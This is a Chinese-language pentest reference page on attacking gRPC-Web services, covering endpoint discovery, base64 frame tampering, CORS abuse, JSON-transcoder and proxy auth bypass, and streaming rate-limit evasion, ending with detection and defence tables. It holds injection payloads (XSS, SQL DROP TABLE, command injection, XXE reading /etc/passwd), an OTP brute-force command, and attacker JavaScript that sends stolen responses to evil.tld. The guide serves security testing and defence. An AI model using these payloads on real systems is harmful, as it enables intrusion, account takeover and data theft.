---
attack_surface: [编码/序列化滥用, 缓存/代理逻辑, 认证/授权绕过]
impact: [身份伪造, 权限提升, 信息泄露, 完整性破坏]
risk_level: 高
prerequisites:
  - HTTP/1.1 协议理解
  - Protobuf 基础概念
  - Burp Suite 基础操作
related_techniques:
  - cors-misconfigurations
  - rate-limit-bypass
  - deserialization
  - jwt-attacks
  - graphql-attacks
difficulty: 中级
tools:
  - buf curl
  - grpc-pentest-suite
  - grpcurl
  - protoscope
---

# gRPC-Web Attacks — gRPC-Web 协议攻击全矩阵

> 关联文档：[GraphQL](../GraphQL/) · [CORS Misconfigurations](../../HTTP%20Headers/CORS%20Misconfigurations%20%26%20Bypass/) · [Rate Limit Bypass](../../Bypasses/Rate%20Limit%20Bypass/) · [Deserialization](../Deserialization/)

---

# 0x01 原理与攻击面

## 1.0 TL;DR

gRPC-Web 是 gRPC 的浏览器兼容变体，通过 HTTP/1.1 或 HTTP/2 代理（Envoy/APISIX/grpcwebproxy）与后端通信。**攻击面不在 protobuf 序列化本身，而在协议适配层**——代理的 CORS 配置、JSON 转码器的路由映射、帧格式的手工构造。核心攻击向量：跨域认证调用、JSON 转码认证绕过、帧级 Payload 注入、JS Bundle 逆向发现隐藏端点。

## 1.1 gRPC-Web 协议基础

- **传输层**：HTTP/1.1 或 HTTP/2，仅支持 Unary 和 Server-Streaming（不支持 Client-Streaming 和 Bidirectional）
- **Content-Type**：
  - `application/grpc-web` — 二进制帧（高效，HTTP/2 兼容）
  - `application/grpc-web-text` — base64 编码帧（HTTP/1.1 代理兼容，浏览器默认）
- **帧格式**：每条消息前有 5 字节 gRPC 头 `[1 字节 flags] + [4 字节大端长度]`
- **Trailer 传递**：gRPC-Web 将 trailer（`grpc-status`、`grpc-message`）内嵌在响应体的特殊帧中——首字节 MSB 置 1（`0x80`），后跟长度和 HTTP/1.1 风格的 header 块

## 1.2 关键协议头部

| 头部 | 位置 | 含义 |
|------|------|------|
| `Content-Type: application/grpc-web-text` | 请求 | base64 编码帧模式 |
| `X-Grpc-Web: 1` | 请求 | 声明 gRPC-Web 协议 |
| `X-User-Agent: grpc-web-javascript/0.1` | 请求 | 客户端标识 |
| `Grpc-Timeout` | 请求 | 超时设置（带单位，如 `3S`） |
| `Grpc-Encoding` | 请求 | 压缩方式（`identity` / `gzip`） |
| `Grpc-Status` | 响应 Trailer | gRPC 状态码（`0` = OK） |
| `Grpc-Message` | 响应 Trailer | 错误描述信息 |
| `Access-Control-Expose-Headers: grpc-status,grpc-message` | 响应 | 浏览器 CORS 白名单暴露 |

## 1.3 攻击面全景

```
┌─────────────────────────────────────────────────┐
│                   Browser (JS)                   │
│  grpc-web-client  ────────────  base64 frames   │
└──────────────────┬──────────────────────────────┘
                   │ HTTP/1.1 or HTTP/2
                   ▼
┌─────────────────────────────────────────────────┐
│              Proxy (Envoy/APISIX)               │
│                                                 │
│  ★ CORS misconfig → cross-site auth calls       │
│  ★ JSON Transcoder → HTTP→gRPC auth mismatch    │
│  ★ Header passthrough → upstream manipulation   │
└──────────────────┬──────────────────────────────┘
                   │ HTTP/2 gRPC
                   ▼
┌─────────────────────────────────────────────────┐
│              gRPC Backend Service               │
│                                                 │
│  ★ Reflection API → endpoint enumeration        │
│  ★ Field validation gaps → protobuf injection   │
│  ★ Error messages → information disclosure      │
└─────────────────────────────────────────────────┘
```

# 0x02 端点发现

## 2.1 反射 API 枚举

gRPC Server Reflection 是服务发现的首要入口。如果启用（生产环境中约占 15-20%），可获取完整的服务和方法列表。

```bash
# buf curl — 原生支持 gRPC-Web，自动处理帧编码
buf curl --protocol grpcweb https://target.tld --list-methods
```

输出示例：
```
grpc.gateway.testing.EchoService/Echo
grpc.gateway.testing.EchoService/EchoAbort
grpc.gateway.testing.EchoService/NoOp
grpc.gateway.testing.EchoService/ServerStreamingEcho
grpc.gateway.testing.UserService/GetUser
grpc.gateway.testing.UserService/UpdateUser
```

**白盒测试**（有 `.proto` 文件时）可使用 grpcui 生成 Web UI 进行交互式测试：

```bash
protoc --proto_path=. --descriptor_set_out=svc.protoset --include_imports ./svc.proto
grpcui -protoset svc.protoset -plaintext localhost:8080
```

**如果反射被禁用**，通过 `--schema` 或本地 `.proto` 文件提供描述符：

```bash
buf curl --protocol grpcweb --schema service.bin --list-methods https://target.tld
```

## 2.2 JavaScript Bundle 逆向

Web 应用使用 gRPC-Web 时，前端 JS bundle 中包含编译后的 `.proto` 定义和完整的服务/方法映射。使用 grpc-scan 提取。

**步骤**：

1. 下载 JS bundle（浏览器 DevTools → Sources → 搜索 `grpcweb` 或 gRPC 客户端库特征字符串）
2. 扫描提取：

```bash
python3 grpc-scan.py --file main.js
```

3. 分析输出的端点列表和消息结构（详见 §2.3）

**JS 中可提取的关键信息**：
- 完整方法路径：`/<package>.<Service>/<Method>`
- 消息字段名、类型、编号
- 自定义拦截器（auth token 注入方式）
- 服务端 streaming 标记

**gRPC-Web 客户端特征字符串**（用于 grep 定位到 bundle 中的相关代码）：

```
grpc.web.
x-grpc-web
grpcwebtext
application/grpc-web
```

## 2.3 消息结构提取

grpc-scan 输出完整的 protobuf 消息定义，包含字段名、类型和编号：

```
Found Endpoints:
  /grpc.gateway.testing.EchoService/Echo
  /grpc.gateway.testing.EchoService/EchoAbort
  /grpc.gateway.testing.EchoService/NoOp
  /grpc.gateway.testing.EchoService/ServerStreamingEcho

Found Messages:

grpc.gateway.testing.EchoRequest:
+------------+--------------------+--------------+
| Field Name |     Field Type     | Field Number |
+============+====================+==============+
| Message    | Proto3StringField  | 1            |
| Name       | Proto3StringField  | 2            |
| Age        | Proto3IntField     | 3            |
| IsAdmin    | Proto3BooleanField | 4            |
| Weight     | Proto3FloatField   | 5            |
| Test       | Proto3StringField  | 6            |
| Test2      | Proto3StringField  | 7            |
| Test3      | Proto3StringField  | 16           |
| Test4      | Proto3StringField  | 20           |
+------------+--------------------+--------------+
```

**攻击价值**：
- 字段名推断业务逻辑（`IsAdmin`、`Role`、`Secret` 等暗示权限相关字段）
- 字段编号的间隙（跳过 8-15、17-19）暗示**已删除字段**——尝试手工添加可能触发未预期的后端路径
- `Proto3StringField` 字段是注入测试的主要目标（XSS / SQLi / NoSQLi / SSTI 等，见 §3.3）

# 0x03 Payload 编码与篡改

## 3.1 背景：为何需要手工操纵帧

gRPC-Web 的 `application/grpc-web-text` Content-Type 本质上是 **base64 包裹的 gRPC 二进制帧流**。这意味着你可以像处理普通 HTTP 请求体一样——解码 → 修改 → 重新编码——绕过浏览器 gRPC 客户端的约束，手工构造任意字段值。

## 3.2 解码

```bash
echo "AAAAABYSC0FtaW4gTmFzaXJpGDY6BVhlbm9u" | python3 grpc-coder.py --decode --type grpc-web-text | protoscope > out.txt
```

解码后 `out.txt` 内容：
```
2: {"Amin Nasiri"}
3: 54
7: {"Xenon"}
```

每个字段由 **field number** (protobuf wire format) 标识，后跟类型和值。修改时保持字段编号不变，改变值。

## 3.3 字段级篡改

对解码后的 protoscope 输出直接编辑：

```
# 原始
2: {"Amin Nasiri"}
3: 54
7: {"Xenon"}

# 篡改后 — 注入 XSS Payload
2: {"Amin Nasiri Xenon GRPC"}
3: 54
7: {"<script>alert(origin)</script>"}
```

重新编码：

```bash
protoscope -s out.txt | python3 grpc-coder.py --encode --type grpc-web-text
```

输出可直接用于 Burp Repeater：
```
AAAAADoSFkFtaW4gTmFzaXJpIFhlbm9uIEdSUEMYNjoePHNjcmlwdD5hbGVydChvcmlnaW4pPC9zY3JpcHQ+
```

## 3.4 注入测试向量

在解码后的字段值中依次测试以下 Payload 类别：

| 注入类型 | 示例 Payload | 适用条件 |
|----------|-------------|----------|
| **XSS** | `<script>alert(1)</script>` | 响应中的字符串字段被前端渲染到 DOM |
| **SQLi** | `' OR '1'='1` / `1; DROP TABLE users--` | 字段值直接拼接到 SQL 查询 |
| **NoSQLi** | `{"$ne": null}` (JSON 字符串形式) | MongoDB 等 NoSQL 后端 |
| **SSTI** | `{{7*7}}` / `${7*7}` | 字段值进入模板引擎 |
| **命令注入** | `; id` / `\| whoami` | 字段值被拼接到 shell 命令 |
| **XXE** | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>&xxe;` | XML 中间表示存在时 |
| **整数溢出** | `-1` / `2147483648` / `0xFFFFFFFF` | 数字字段 (`Proto3IntField`) |
| **布尔翻转** | `true` → `false` / `false` → `true` | Boolean 字段 (`Proto3BooleanField`) |

> **真实案例**：Amin Nasiri 在真实渗透测试中发现某旅游公司的 gRPC-Web `/Search2` 端点未做 SQLi 防护——对 gRPC-Web 帧解码后注入 SQL Payload 并重新编码，成功获取未授权数据。该漏洞属于"低垂果实"级别，仅因大多数渗透测试者不熟悉 gRPC-Web 帧操作而未被发现。

protobuf 反序列化本身的安全问题（类型混淆、深度递归、未知字段处理）参见 [Deserialization](../Deserialization/)。

> **注意**：注入 Payload 必须通过 protobuf wire format 编码后才能发送。直接粘贴原始 Payload 到 Burp 而未经 grpc-coder 编码会导致服务端解析失败（protobuf 反序列化错误），而非触发注入。

## 3.5 工具链

| 工具 | 用途 |
|------|------|
| [grpc-pentest-suite](https://github.com/nxenon/grpc-pentest-suite) | grpc-coder（编解码）+ grpc-scan（JS 逆向）+ Burp 插件 |
| [buf curl](https://buf.build/docs/curl/usage) | 原生 gRPC-Web CLI 客户端，支持反射和 schema |
| [protoscope](https://github.com/protocolbuffers/protoscope) | protobuf 可读格式的解析/组装 |
| [grpcurl](https://github.com/fullstorydev/grpcurl) | gRPC 反射和调用（需 HTTP/2，非 gRPC-Web） |

# 0x04 CORS 跨域攻击

## 4.1 gRPC-Web CORS 的特殊性

gRPC-Web 浏览器客户端在发送跨域请求时，必须经过 CORS 预检。由于 gRPC-Web 使用非标准的 `Content-Type` 和自定义头部，`Access-Control-Allow-Headers` 必须显式列出这些字段，否则浏览器拦截。

**必需的 CORS 预检头部**：

```http
OPTIONS /pkg.svc.v1.Service/Method HTTP/1.1
Host: target.tld
Origin: https://evil.tld
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type,x-grpc-web,x-user-agent,grpc-timeout
```

## 4.2 检测流程

```bash
# Step 1: 预检请求
curl -i -X OPTIONS https://target.tld/pkg.svc.v1.Service/Method \
  -H 'Origin: https://evil.tld' \
  -H 'Access-Control-Request-Method: POST' \
  -H 'Access-Control-Request-Headers: content-type,x-grpc-web,x-user-agent,grpc-timeout'
```

CORS 通用检测与绕过技术详见 [CORS Misconfigurations](../../HTTP%20Headers/CORS%20Misconfigurations%20%26%20Bypass/)。以下为 gRPC-Web 特定场景。

**漏洞判定条件（满足任一即可利用）**：

1. `Access-Control-Allow-Origin` 反射任意 Origin **且** `Access-Control-Allow-Credentials: true`
2. `Access-Control-Allow-Origin: *` 配合无 Credentials 的请求（仍可发起非认证 CSRF 风格的调用）
3. `Access-Control-Expose-Headers` 包含 `grpc-status`, `grpc-message` — 泄露 gRPC 错误详情给攻击者

## 4.3 攻击场景

**场景 1：跨域认证调用**（最严重）

受害者已登录 `target.tld`（Cookie/Token 自动附加）。攻击者在 `evil.tld` 上托管 JS，通过 gRPC-Web 客户端发起跨域请求——浏览器自动携带目标域的身份凭证。

```javascript
// 托管在 evil.tld 上的恶意 JS
const client = new EchoServiceClient('https://target.tld');
const request = new EchoRequest();
request.setMessage('attacker_controlled');
request.setIsAdmin(true);  // 尝试提权
client.echo(request, {}, (err, resp) => {
  // 响应数据被 CORS 允许时，可回传给攻击者
  fetch('https://evil.tld/log?data=' + btoa(resp.serializeBinary()));
});
```

**场景 2：gRPC 错误信息泄露**

许多部署在 `Access-Control-Expose-Headers` 中暴露 `grpc-status` 和 `grpc-message`。当 gRPC 调用失败时，`grpc-message` 可能包含敏感的内部错误详情（数据库错误、文件路径、内部 IP 等），这些信息通过 CORS 跨域泄漏给攻击者。

# 0x05 代理与 JSON 转码绕过

## 5.1 gRPC-JSON Transcoder 原理

Envoy 的 gRPC-JSON Transcoder 根据 `.proto` 文件中的 `google.api.http` 注解，将 HTTP JSON 请求转换为 gRPC 调用。一条 gRPC 方法可能同时通过以下路径访问：

```
POST /pkg.svc.v1.Service/Method   (Content-Type: application/grpc-web-text)
POST /v1/service/method           (Content-Type: application/json) ← Transcoder 映射
```

**核心问题**：两条路径可能经过不同的认证/授权中间件。JSON 路径可能被遗漏在认证要求之外。

## 5.2 JSON 路径枚举与测试

当发现 gRPC-Web 端点时，尝试以下 JSON 变体：

```bash
# 原始 gRPC-Web 方法路径 → 尝试 Content-Type: application/json
curl -i https://target.tld/pkg.svc.v1.Service/Method \
  -H 'Content-Type: application/json' \
  -d '{"field":"value"}'

# 尝试 REST 风格映射（常见于 google.api.http 注解）
curl -i https://target.tld/v1/service/method \
  -H 'Content-Type: application/json' \
  -d '{"field":"value"}'

# 尝试 GET 版本（某些 transcoder 配置支持）
curl -i 'https://target.tld/v1/service/method?field=value'
```

**关键观察点**：
- JSON 路径是否要求认证？（与 gRPC-Web 路径对比）
- 未认证的 JSON 路径是否返回敏感数据？
- 参数校验是否一致？（gRPC-Web 有校验但 JSON 路径遗漏）

## 5.3 代理头部注入

Envoy 和 APISIX 在处理 gRPC-Web 时会添加以下上游转发头部：

- `x-envoy-original-path` — 原始请求路径
- `x-envoy-original-method` — 原始 HTTP 方法
- `x-forwarded-proto` — 原始协议

如果上游服务信任这些头部（例如用于路由决策），尝试注入：

```bash
curl -i https://target.tld/pkg.svc.v1.Service/Method \
  -H 'Content-Type: application/grpc-web-text' \
  -H 'X-Grpc-Web: 1' \
  -H 'X-Envoy-Original-Path: /admin/internal/debug' \
  -H 'X-Forwarded-Proto: https' \
  --data-binary @body.b64
```

> **注意**：代理通常在下游请求到达时**覆盖**这些头部。此技术仅在代理未正确清理上游传入头部时有效——检查代理配置中的 `sanitize_forwarded_headers` 或等效选项。

## 5.4 未匹配路由的认证绕过

某些 Envoy 配置将未匹配的路径**透传**到上游 gRPC 服务。如果认证中间件只应用于已知路由列表，而未知路由被直接转发：

```bash
# 尝试伪造的方法名（可能路由到不同的 handler）
curl -i https://target.tld/pkg.svc.v1.Service/NonexistentMethod \
  -H 'Content-Type: application/grpc-web-text' \
  -H 'X-Grpc-Web: 1' \
  --data-binary @body.b64

# 尝试空方法或根路径
curl -i https://target.tld/pkg.svc.v1.Service/ \
  -H 'Content-Type: application/grpc-web-text' \
  -H 'X-Grpc-Web: 1' \
  --data-binary @body.b64
```

**判定方法**：比较已知方法（需认证）和未知方法（可能绕过）的响应差异。如果未知方法返回 gRPC 错误（`grpc-status: 12 UNIMPLEMENTED`）而非 HTTP 403，说明请求已到达 gRPC 服务——认证在代理层被绕过。

# 0x06 gRPC Streaming 速率限制绕过

## 6.1 原理

边缘速率限制器（Cloudflare、AWS WAF、Nginx rate-limit 模块）通常只检查**初始 HTTP 请求**。一旦连接升级为 WebSocket（HTTP 101）或建立 gRPC 双向 streaming，后续消息帧不再作为独立的 HTTP 请求被计数——它们在同一连接内以二进制帧形式传输，完全绕过基于请求计数的速率限制。

Cloudflare 官方文档确认：只有初始升级请求受 WAF/速率限制规则约束；后续帧对 WAF 不透明。

## 6.2 OTP / 登录爆破应用

```bash
# gRPC streaming: 在单个流式连接内发送多次 OTP 尝试验证
grpcurl -d @ -plaintext target.tld:50051 service.VerifyOTP/Stream <<'EOF'
{ "code": "111111" }
{ "code": "222222" }
{ "code": "333333" }
{ "code": "444444" }
...
EOF
```

一次连接 = 无限次尝试。从速率限制器的视角看，只有一个 HTTP 请求。更多通用绕过技术参见 [Rate Limit Bypass](../../Bypasses/Rate%20Limit%20Bypass/)。

> **前提条件**：目标端点必须暴露 gRPC streaming 接口（非 gRPC-Web）。gRPC-Web 不支持 Client-Streaming，因此此技术在纯 gRPC-Web 场景下不可用。但如果 gRPC 后端同时暴露 gRPC 原生端口（通常 50051）和 gRPC-Web 代理端口（443），gRPC 端口上的 streaming 绕过仍然有效。

# 0x0A 检测与防御

## A.1 攻击检测特征

| 攻击类型 | 可检测特征 |
|---------|-----------|
| 反射枚举 | 对同一路径的大量方法探测；非标准 Content-Type 无认证的 OPTIONS 请求 |
| JS Bundle 逆向 | 无（攻击者本地操作，不产生网络流量） |
| 帧级 Payload 篡改 | base64 编码体中包含解码后为注入 Payload 的内容；异常的字段编号值 |
| CORS 跨域攻击 | 对 gRPC-Web 端点的 OPTIONS 预检 + Origin 头部变化 |
| JSON 转码绕过 | 同一路径的 `Content-Type: application/json` 请求（正常 gRPC-Web 客户端不会发送此 Content-Type） |
| Streaming 速率绕过 | 单个 TCP 连接内的异常高频消息帧 |

## A.2 分层防御

| 层面 | 措施 |
|------|------|
| **代理层** | 禁用生产环境中的 gRPC Reflection；严格限制 CORS（白名单 Origin，禁止 `*`）；不将 `grpc-status`/`grpc-message` 暴露在 `Access-Control-Expose-Headers` 中 |
| **Transcoder 层** | JSON 和 gRPC-Web 路径使用**相同的认证中间件**；显式定义所有路由，禁止将未匹配路径透传到上游；清理上游转发头部（`x-envoy-original-path` 等） |
| **应用层** | 对所有 protobuf 字段进行服务器端输入验证（不依赖客户端验证）；对字符串字段实施上下文感知的输出编码；统一处理 gRPC 错误消息，不泄露内部状态 |
| **网络层** | gRPC 原生端口（如 50051）仅允许内部网络访问，不暴露到公网；在代理层配置连接级别的消息频率限制（而非仅请求级别的速率限制） |
| **监控层** | 对反射 API 调用设置告警阈值；监控 `Content-Type: application/json` 对 gRPC 路径的访问；追踪单个连接内的消息帧频率 |

---

## 参考资料

- [Hacking into gRPC-Web — Amin Nasiri](https://infosecwriteups.com/hacking-into-grpc-web-a54053757a45)
- [gRPC-Web Pentest Suite](https://github.com/nxenon/grpc-pentest-suite)
- [gRPC-Web Protocol Specification (PROTOCOL-WEB.md)](https://chromium.googlesource.com/external/github.com/grpc/grpc/%2B/v1.16.1/doc/PROTOCOL-WEB.md)
